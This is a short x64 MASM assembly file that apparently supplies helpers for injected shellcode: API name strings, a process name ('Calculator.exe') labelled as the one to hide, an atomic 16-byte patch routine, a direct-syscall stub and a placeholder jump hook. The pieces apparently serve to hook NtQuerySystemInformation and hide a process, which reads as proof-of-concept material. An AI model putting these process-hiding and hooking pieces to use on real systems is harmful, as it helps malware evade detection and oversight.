OPTION DOTNAME
.code .text$y

; strings defined here to ensure they are located within the shellcode
strVirtualProtect BYTE "VirtualProtect", 0
strFlushInstructionCache BYTE "FlushInstructionCache", 0
strNtQuerySystemInformation BYTE "NtQuerySystemInformation", 0
wstrBadProcessName WORD "C", "a", "l", "c", "u", "l", "a", "t", "o", "r", ".", "e", "x", "e", 0

PUBLIC strVirtualProtect
PUBLIC strFlushInstructionCache
PUBLIC strNtQuerySystemInformation
PUBLIC wstrBadProcessName

Atomic16ByteWrite PROC PUBLIC

	push rsi
	push rdi

	mov rsi, rdx
	mov rdi, rcx

	mov rax, [rdi]
	mov rdx, [rdi+8]
	mov rbx, [rsi]
	mov rcx, [rsi+8]

	lock cmpxchg16b[rdi]

	pop rdi
	pop rsi
	ret

Atomic16ByteWrite ENDP

SyscallStub PROC PUBLIC

	mov r10, rcx
	mov eax, 0ffffffffh
	syscall
	ret

SyscallStub ENDP

Hook PROC PUBLIC

	mov rax, 0ffffffffffffffffh
	jmp rax
	dd 0

Hook ENDP

END